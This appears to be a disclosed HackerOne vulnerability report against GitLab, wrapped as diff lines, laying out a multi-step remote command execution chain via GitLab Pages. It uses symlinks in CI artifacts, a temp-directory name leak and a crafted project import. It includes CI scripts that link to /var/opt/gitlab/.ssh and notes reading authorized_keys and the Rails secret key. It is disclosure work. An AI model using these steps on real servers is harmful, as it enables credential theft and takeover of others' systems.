@@ -1,0 +1,212 @@
+'**[HackerOne report #473210](https://hackerone.com/reports/473210)** by `bink` on 2018-12-29:
+
+Remote Command Execution via GitLab Pages
+==================================
+
+Happy Holidays, GitLab!
+
+I've found a flaw involving symlink support in GitLab Pages / Artifacts that
+allows for arbitrary command execution.
+
+This is a bit complicated to exploit. I hope I've done a good job with the 
+write-up but feel free to ask questions.
+
+The basic flaw is that GitLab Pages extracts HTML from a file named 
+`artifacts.zip` that is uploaded by a GitLab Runner via Workhorse. The Runner
+takes care of creating the zip file that includes the custom HTML content provided
+by the user in a CI job. This file is uploaded to GitLab where it is extracted
+to a temporary directory. Because zip files can support symlinks we can perform
+some crafty maneuvering to step-by-step move a symlink from the temporary
+directory to a directory of our choosing.
+
+### Step 1 - Create a project named "public"
+Under our user account we create a project named "public". The name is key to
+the attack, and the reason we use "public" will become clear later.
+
+We open an issue in the "public" project and include an attachment.
+
+We then view the attachment link and record the random hash used in the URL for 
+this attachment. This will be used in steps 4 and 6. (see attached images)
+
+### Step 2 - Create an attack project that uses Pages
+We want to now create a project that will utilize the Pages feature to create
+our first symlink. 
+
+This project needs a runner to use Pages so we go ahead and register a runner 
+and enable it or we can use shared runner on the server if it exists.
+
+* Create the project "attack".
+* Enable a runner.
+* Add a CI file and use the Pages HTML template.
+
+Adjust the CI file to look like so:
+
+```
+pages:
+  stage: deploy
+  script:
+  - mkdir .public
+  - cp -r * .public
+  - mv .public public
+  - mkdir -p /var/opt/gitlab/gitlab-rails/uploads/<user>/
+  - ln -s /var/opt/gitlab/gitlab-rails/uploads/<user>/ public/tmpx
+  - chmod a-w public
+  artifacts:
+    paths:
+    - public
+  only:
+  - master
+```
+We replace &lt;user&gt; with our username.
+
+Here we're linking to a directory that will be used as a first step towards global file 
+access. We're choosing the `uploads` directory corresponding to our own username 
+for reasons that will be explained later.  It's best not to use capital letters 
+as GitLab can lower-case the path to a project when the project is created.
+
+The last script line is key. Normally the contents of the `public` directory will 
+be zipped and uploaded to the GitLab server. There it will be unarchived to a 
+temporary directory in `/var/opt/gitlab/gitlab-rails/shared/pages/tmp/<semi-random dir>/public/`.
+
+Things start to get complicated here. For performance reasons any existing Pages 
+files are not simply removed and the new ones copied into the same directory as
+the deletion can take time to finish.
+
+Instead, this `tmp/.../public` directory will be moved into the project's Pages 
+directory (/var/opt/gitlab/gitlab-rails/shared/pages/\<user\>/\<project\>) with a name like 
+`public.<randomhex1>`. The old `public` Pages directory (if there is one) will 
+then be moved to something like `public.<randomhex2>`. Then `public.<randomhex1>` 
+will be moved to `public` to complete the process.
+
+It seems like this would accomplish our goal of getting access to sensitive files 
+via the symlink, but it will not. The Pages daemon is chroot'd to the Pages 
+directory. The most we could do is access the already public files of other users.
+
+Above I made a point of mentioning the temporary directory to which Pages files are
+extracted before they are moved to the public Pages directories. These tmp directories
+fall under `/var/opt/gitlab/gitlab-rails/shared/pages/tmp/`. Notice that this 
+shares the same root as the actual public directories. In our case: 
+`/var/opt/gitlab/gitlab-rails/shared/pages/<user>/<project>/`
+
+We can therefore use a group named `tmp/<semi-random dir>/public` and have our pages files
+copied into the symlinked directory. But it is not so easy. These tmp folders 
+are normally removed when the Pages files are `mv`'d into their public locations.
+To stop this we use that final line in the Pages CI shown above: `chmod a-w public`.
+This will prevent the server from removing the directory when it is finished.
+
+### Step 3 - Create our subgroups
+I said above that we can use a temporary directory with a semi-random name as our 
+subgroup in order to gain the ability to copy arbitrary files across the symlink we
+created. But if this directory has a semi-random name, how can we find it?
+
+As it turns out, GitLab will happily show you the directory name in the error message
+returned by the Pages deploy job when it finds it can't delete the temporary directory. Simply hover over the failed job and you will see an error that includes the full path. (see attachments)
+
+This temporary directory name will be of the format `tmp/dYYYYMMDD-<pid>-<random>`.
+
+Use this information to create a subgroup of the format `tmp/dYYYYMMDD-<pid>-<random>/public`.
+
+### Step 4 - Create our second Pages project
+Now we just need a project with Pages enabled to copy _another_ symlink across
+the first symlink directory. This second symlink will point at the file or 
+directory to which we want access.
+
+Create a project under the `tmp/dYYYYMMDD-<pid>-<random>/public` namespace named `tmpx`
+(the name we chose in the CI file in Step 2). Enable a runner and create a GitLab CI
+file using the Pages HTML template. The contents of the file should look like 
+this: 
+
+```
+pages:
+  stage: deploy
+  script:
+  - mkdir .public
+  - cp -r * .public
+  - mv .public public
+  - mkdir -p /var/opt/gitlab/.ssh
+  - ln -s /var/opt/gitlab/.ssh public/<uploads random directory name>
+  artifacts:
+    paths:
+    - public
+  only:
+  - master
+```
+
+We need to use the randomly generated uploads directory name we saw when we 
+created our very first project and uploaded an attachment (Step 1). The result of running 
+this Pages pipeline will be that the `/var/opt/gitlab/gitlab-rails/uploads/<user>/public/` 
+directory will now contain our new symlink, with the random name, pointing at
+`/var/opt/gitlab/.ssh`. Now we could stop here, as we have the ability to read 
+arbitrary files from any folder just by fetching the URL:
+
+`http://<gitlab_instance>/<user>/public/uploads/<random>/authorized_keys`
+
+(see attachments for demo)
+
+We could have simply pointed the link to `/var/opt/gitlab/gitlab-rails/etc/` and 
+read the Rails secret key which would have allowed us to authenticate as any user.
+But we're not happy with just read and/or application access, we want write 
+access to gain an immediate shell.
+
+### Step 5 - Export the "public" project
+The rest of this exploit works similarly to previously reported Gitlab file 
+import vulnerabilities, but instead of copying a symlink into the uploads folder 
+we will use the existing symlink we created above and copy across it.
+
+We must create a GitLab export for the `<user>/public` project and download it. This 
+export will not contain an `uploads` directory as we effectively deleted the old 
+attachment we created in Step 1 when we moved our new Pages folder into place.
+
+The contents should look like this:
+
+```
+tar -tzf file.tar.gz
+VERSION
+project.bundle
+project.json
+```
+
+Now we delete the `<user>/public` project. This leaves our newly created uploads directory in-place.
+
+### Step 6 - Create a new custom GitLab import file and import it
+We then extract the previous export into a temporary directory and inside that 
+directory we run:
+
+```
+mkdir -p uploads/<random hash from step 1>/
+```
+
+We can create an `authorized_keys` file inside that randomly named folder which 
+should be copied into `/var/opt/gitlab/.ssh`. This file can contain our own 
+pub key and run the command of our choosing. For demonstration purposes it's best 
+to use another file name, however. So we can create a file named `HACKED.txt` 
+with the contents "hack the planet!".
+
+```
+echo "hack the planet!" &gt; uploads/<random hash>/HACKED.txt
+```
+
+Then we re-tar the file making sure not to include the upload directories themselves.
+
+```
+tar -czf ../new.tar.gz VERSION project.* uploads/<random dir>/HACKED.txt
+```
+
+We then import this file using the same name as before, `<user>/public`.
+
+And there we have it, there should now be a file on the GitLab server named `/var/opt/gitlab/.ssh/HACKED.txt`.
+
+```
+# cat /var/opt/gitlab/.ssh/HACKED.txt
+hack the planet!
+```
+
+## Impact
+
+Shell access to a GitLab instance, the ability to execute arbitrary commands as the `git` user, and the ability to access and modify arbitrary repositories.
+
+## Attachments
+**Warning:** Attachments received through HackerOne, please exercise caution!
+* [viewing_the_tmp_dir_name.png](https://h1.sec.gitlab.net/a/473210/398808/viewing_the_tmp_dir_name.png)
+* [downloading_arbitrary_files.png](https://h1.sec.gitlab.net/a/473210/398809/downloading_arbitrary_files.png)
+* [viewing_the_uploads_path.png](https://h1.sec.gitlab.net/a/473210/398810/viewing_the_uploads_path.png)
